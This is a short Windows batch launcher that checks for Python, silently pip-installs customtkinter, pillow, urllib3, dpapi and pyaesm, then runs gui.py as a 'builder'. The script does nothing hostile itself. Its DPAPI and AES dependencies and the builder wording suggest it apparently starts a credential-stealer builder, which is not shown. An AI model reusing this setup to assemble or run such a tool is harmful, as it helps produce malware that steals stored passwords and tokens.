@echo off
cd /d %~dp0

title Checking Python installation...
python --version > nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed! (Go to https://www.python.org/downloads and install the latest version.^)
    goto ERROR
)

title Checking libraries...
echo Checking 'customtkinter' (1/5)
pip show customtkinter > nul 2>&1
if %errorlevel% neq 0 (
    title Installing customtkinter...
    pip install customtkinter > nul
)

echo Checking 'pillow' (2/5)
pip show pillow > nul 2>&1
if %errorlevel% neq 0 (
    title Installing pillow...
    pip install pillow > nul
)

echo Checking 'urllib3' (3/5)
pip show urllib3 > nul 2>&1
if %errorlevel% neq 0 (
    title Installing urllib3...
    pip install urllib3 > nul
)

echo Checking 'dpapi' (4/5)
pip show dpapi > nul 2>&1
if %errorlevel% neq 0 (
    title Installing dpapi...
    pip install dpapi > nul
)

echo Checking 'pyaesm' (5/5)
pip show pyaesm > nul 2>&1
if %errorlevel% neq 0 (
    title Installing pyaesm...
    pip install pyaesm > nul
)

cls
title Starting builder...
python gui.py
if %errorlevel% neq 0 goto ERROR
exit

:ERROR
color 4 && title [Error]
pause > nul